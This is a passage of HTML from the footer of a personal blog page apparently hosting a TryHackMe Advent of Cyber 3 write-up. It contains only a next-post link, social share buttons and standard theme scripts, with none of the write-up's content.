<a class=next href=https://git-akihakune.github.io/blog/racecar/><span class=title>Next Page »</span><br><span>Hack The Box Pwn challenge - racecar</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 2) on twitter" href="https://twitter.com/intent/tweet/?text=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%202%29&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3-2%2f&hashtags=ctf%2ctech"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 2) on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3-2%2f&title=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%202%29&summary=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%202%29&source=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3-2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 2) on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3-2%2f&title=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%202%29"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 2) on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3-2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 2) on whatsapp" href="https://api.whatsapp.com/send?text=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%202%29%20-%20https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3-2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Try Hack Me - Advent Of Cyber 3 writeup (Part 2) on telegram" href="https://telegram.me/share/url?text=Try%20Hack%20Me%20-%20Advent%20Of%20Cyber%203%20writeup%20%28Part%202%29&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fadventofcyber3-2%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://git-akihakune.github.io>Hakune Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"rgba(0, 0, 0, 0.8)"})})</script><script type=module src=https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js></script>
<script nomodule src=https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js></script>
<script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>